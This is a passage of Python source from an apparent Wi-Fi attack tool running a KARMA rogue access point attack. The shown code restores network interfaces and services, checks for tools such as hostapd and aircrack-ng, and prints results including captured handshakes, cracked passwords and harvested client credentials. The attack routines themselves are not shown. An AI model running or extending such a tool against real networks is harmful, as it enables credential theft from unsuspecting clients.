        # Enhanced rfkill unblocking
        try:
            result = subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True, text=True)
            if result.returncode == 0:
                Color.pl('{+} {G}Unblocked all rfkill devices{W}')
            else:
                Color.pl('{!} {R}CRITICAL: Failed to unblock rfkill devices{W}')
                Color.pl('{!} {O}Run manually: {C}sudo rfkill unblock all{W}')
        except Exception as e:
            Color.pl('{!} {R}CRITICAL: Failed to unblock rfkill: {O}%s{W}' % str(e))
            Color.pl('{!} {O}Run manually: {C}sudo rfkill unblock all{W}')

        # Enhanced interface restoration for optimal scanning
        self.enhanced_interface_restoration()

        # Restart network services for optimal scanning
        self.restart_network_services_for_scanning()
        
        # Wait for services to stabilize
        Color.pl('{+} {C}Waiting for network services to stabilize...{W}')
        time.sleep(3)
        
        # Verify restoration
        self.verify_network_restoration()
    
    def enhanced_interface_restoration(self):
        """Enhanced interface restoration for optimal scanning"""
        try:
            Color.pl('{+} {C}Performing enhanced interface restoration...{W}')
            
            # Get all wireless interfaces
            interfaces_to_restore = []
            if hasattr(self, 'probe_interface') and self.probe_interface:
                interfaces_to_restore.append(self.probe_interface)
            if hasattr(self, 'rogue_interface') and self.rogue_interface:
                interfaces_to_restore.append(self.rogue_interface)
            
            # Also check for common interface names
            common_interfaces = ['wlan0', 'wlan1', 'wlan2', 'wlp3s0', 'wlp4s0']
            for iface in common_interfaces:
                try:
                    result = subprocess.run(['iwconfig', iface], capture_output=True, timeout=2)
                    if result.returncode == 0 and iface not in interfaces_to_restore:
                        interfaces_to_restore.append(iface)
                except:
                    pass
            
            # Restore each interface
            for iface in interfaces_to_restore:
                try:
                    Color.pl('{+} {C}Restoring interface {G}%s{W} for optimal scanning...{W}' % iface)
                    
                    # Stop airmon-ng if running
                    try:
                        subprocess.run(['airmon-ng', 'stop', iface], capture_output=True, timeout=5)
                    except:
                        pass
                    
                    # Bring interface down
                    subprocess.run(['ip', 'link', 'set', iface, 'down'], capture_output=True, timeout=5)
                    time.sleep(1)
                    
                    # Set to managed mode
                    subprocess.run(['iw', 'dev', iface, 'set', 'type', 'managed'], capture_output=True, timeout=5)
                    time.sleep(1)
                    
                    # Flush IP addresses
                    subprocess.run(['ip', 'addr', 'flush', 'dev', iface], capture_output=True, timeout=5)
                    
                    # Bring interface up
                    subprocess.run(['ip', 'link', 'set', iface, 'up'], capture_output=True, timeout=5)
                    time.sleep(2)
                    
                    # Verify interface is working
                    result = subprocess.run(['iwconfig', iface], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and 'Mode:Managed' in result.stdout:
                        Color.pl('{+} {G}Interface {G}%s{W} restored successfully{W}' % iface)
                    else:
                        Color.pl('{!} {O}Warning: Interface {G}%s{W} may not be fully restored{W}' % iface)
                    
                except Exception as e:
                    Color.pl('{!} {O}Warning: Failed to restore interface {G}%s{W}: {R}%s{W}' % (iface, str(e)))
            
        except Exception as e:
            Color.pl('{!} {R}Error in enhanced interface restoration: {O}%s{W}' % str(e))
    
    def restart_network_services_for_scanning(self):
        """Restart network services for optimal scanning"""
        try:
            Color.pl('{+} {C}Restarting network services for optimal scanning...{W}')
            
            # Restart NetworkManager for better scanning
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True)
                if result.returncode == 0:
                    subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
                    Color.pl('{+} {G}Restarted NetworkManager for optimal scanning{W}')
                else:
                    subprocess.run(['systemctl', 'start', 'NetworkManager'], capture_output=True)
                    Color.pl('{+} {G}Started NetworkManager for optimal scanning{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to restart NetworkManager: {R}%s{W}' % str(e))
            
            # Restart systemd-resolved
            try:
                result = subprocess.run(['systemctl', 'is-active', 'systemd-resolved'], capture_output=True)
                if result.returncode == 0:
                    subprocess.run(['systemctl', 'restart', 'systemd-resolved'], capture_output=True)
                    Color.pl('{+} {G}Restarted systemd-resolved{W}')
                else:
                    subprocess.run(['systemctl', 'start', 'systemd-resolved'], capture_output=True)
                    Color.pl('{+} {G}Started systemd-resolved{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to restart systemd-resolved: {R}%s{W}' % str(e))
            
        except Exception as e:
            Color.pl('{!} {R}Error restarting network services: {O}%s{W}' % str(e))
    
    def verify_network_restoration(self):
        """Verify that network restoration was successful"""
        try:
            Color.pl('{+} {C}Verifying network restoration...{W}')
            
            # Check rfkill status
            try:
                result = subprocess.run(['rfkill', 'list'], capture_output=True, text=True)
                if 'Soft blocked: yes' in result.stdout:
                    Color.pl('{!} {R}WARNING: Some interfaces are still blocked!{W}')
                    Color.pl('{!} {O}Run: {C}sudo rfkill unblock all{W}')
                else:
                    Color.pl('{+} {G}All interfaces are unblocked{W}')
            except:
                pass
            
            # Check NetworkManager status
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True, text=True)
                if 'active' in result.stdout:
                    Color.pl('{+} {G}NetworkManager is active{W}')
                else:
                    Color.pl('{!} {O}NetworkManager is not active{W}')
            except:
                pass
            
            # Check interface status
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                if 'Mode:Managed' in result.stdout:
                    Color.pl('{+} {G}Interfaces are in managed mode{W}')
                else:
                    Color.pl('{!} {O}Some interfaces may not be in managed mode{W}')
            except:
                pass
            
            Color.pl('{+} {G}Network restoration verification complete{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error verifying network restoration: {O}%s{W}' % str(e))
    
    def basic_cleanup(self):
        """Basic cleanup when main restore fails"""
        Color.pl('{!} {R}Performing basic cleanup...{W}')
        
        # Try to unblock rfkill at minimum
        try:
            subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True)
            Color.pl('{+} {G}Basic cleanup: Unblocked rfkill devices{W}')
        except:
            Color.pl('{!} {R}CRITICAL: Basic cleanup failed - run manually: {C}sudo rfkill unblock all{W}')
        
        # Kill any remaining processes
        try:
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            subprocess.run(['pkill', '-f', 'dnsmasq'], capture_output=True)
            Color.pl('{+} {G}Basic cleanup: Killed remaining processes{W}')
        except:
            pass
    
    def show_final_results(self):
        """Show final attack results and statistics"""
        try:
            Color.pl('\n{+} {C}=== Enhanced KARMA Attack Results ==={W}')
            
            if self.captured_handshakes:
                Color.pl('{+} {G}Handshakes Captured: {C}%d{W}' % len(self.captured_handshakes))
                for client, handshake_file in self.captured_handshakes.items():
                    Color.pl('  {G}* {W}%s: %s{W}' % (client, handshake_file))
            
            if self.cracked_passwords:
                Color.pl('{+} {G}Passwords Cracked: {C}%d{W}' % len(self.cracked_passwords))
                for client, password in self.cracked_passwords.items():
                    Color.pl('  {G}* {W}%s: {R}%s{W}' % (client, password))
            
            if self.harvested_credentials:
                Color.pl('{+} {G}Credentials Harvested: {C}%d{W}' % len(self.harvested_credentials))
                for client, credentials in self.harvested_credentials.items():
                    Color.pl('  {G}* {W}%s: {C}%d{W} credentials' % (client, len(credentials)))
            
            if self.connected_clients:
                Color.pl('{+} {G}Total Clients Connected: {C}%d{W}' % len(self.connected_clients))
            
            if self.pnl_networks:
                Color.pl('{+} {G}PNL Networks Captured: {C}%d{W}' % len(self.pnl_networks))
            
            Color.pl('{+} {C}=== End of Results ==={W}')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error showing results: {O}%s{W}' % str(e))

    @staticmethod
    def can_attack_karma():
        """Check if Enhanced KARMA attack is possible (required tools available)"""
        required_tools = ['hostapd', 'dnsmasq', 'tshark', 'aireplay-ng', 'aircrack-ng']
        missing_tools = []
        
        for tool in required_tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            Color.pl('{!} {R}KARMA attack not available - missing required tools: {O}%s{W}' % ', '.join(missing_tools))
            Color.pl('{!} {O}Install missing tools with: sudo apt install %s{W}' % ' '.join(missing_tools))
            return False
        
        # Additional check: test if tools actually work
        try:
            # Test hostapd (help returns 1, which is normal)
            result = subprocess.run(['hostapd', '-h'], capture_output=True, timeout=5)
            if result.returncode not in [0, 1]:  # 0 = success, 1 = help shown
                Color.pl('{!} {R}hostapd found but not working properly{W}')
                Color.pl('{!} {O}This may be due to interface permission issues{W}')
                Color.pl('{!} {O}Try: sudo systemctl stop NetworkManager{W}')
                return False
            
            # Test dnsmasq (version returns 0 on success)
            result = subprocess.run(['dnsmasq', '--version'], capture_output=True, timeout=5)
            if result.returncode != 0:
                Color.pl('{!} {R}dnsmasq found but not working properly{W}')
                Color.pl('{!} {O}Try: sudo apt remove dnsmasq && sudo apt install dnsmasq{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error testing KARMA dependencies: {O}%s{W}' % str(e))
            return False
        
        return True
